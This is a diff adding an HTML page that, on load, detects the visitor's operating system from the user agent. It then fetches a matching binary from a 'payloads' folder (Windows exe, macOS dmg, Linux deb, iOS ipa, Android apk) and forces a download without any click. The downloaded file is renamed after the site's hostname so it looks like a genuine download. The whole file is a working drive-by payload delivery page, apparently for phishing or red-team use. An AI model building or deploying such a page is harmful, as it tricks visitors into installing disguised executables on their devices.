@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Download File</title>
+</head>
+<body>
+  <script>
+    // Get the full URI
+    const uri = window.location.hostname;
+
+    // Get user agent OS
+    const userAgent = navigator.userAgent.toLowerCase();
+    let fileUrl;
+
+    switch (true) {
+      case userAgent.includes('windows'):
+        fileUrl = './payloads/sample-windows.exe';
+        break;
+      case userAgent.includes('mac'):
+        fileUrl = './payloads/sample-mac.dmg';
+        break;
+      case userAgent.includes('linux'):
+        fileUrl = './payloads/sample-linux.deb';
+        break;
+      case userAgent.includes('iphone') || userAgent.includes('ipad'):
+        fileUrl = './payloads/sample-ios.ipa';
+        break;
+      case userAgent.includes('android'):
+        fileUrl = './payloads/sample-android.apk';
+        break;
+      default:
+        // Unsupported OS, handle the case accordingly
+        console.error('Unsupported OS');
+        break;
+    }
+
+    // Make an XHR request to ./payloads/...
+    const xhr = new XMLHttpRequest();
+    xhr.open('GET', fileUrl, true);
+    xhr.responseType = 'blob';
+
+    xhr.onload = function() {
+      if (this.status === 200) {
+        // Get the Blob of the file
+        const blob = this.response;
+
+        // Download the file with new name
+        const a = document.createElement('a');
+        const url = window.URL.createObjectURL(blob);
+        const fileExtension = getFileExtension(fileUrl);
+        a.href = url;
+        a.download = uri + fileExtension;
+        document.body.appendChild(a);
+        a.click();
+        setTimeout(() => {
+          document.body.removeChild(a);
+          window.URL.revokeObjectURL(url);
+        }, 0);
+      }
+    };
+
+    xhr.send();
+
+    // Helper function to extract the file extension from a URL
+    function getFileExtension(url) {
+      const lastDotIndex = url.lastIndexOf('.');
+      console.log(lastDotIndex);
+      console.log(url)
+      return lastDotIndex !== -1 ? url.substring(lastDotIndex) : '';
+    }
+  </script>
+</body>
+</html>
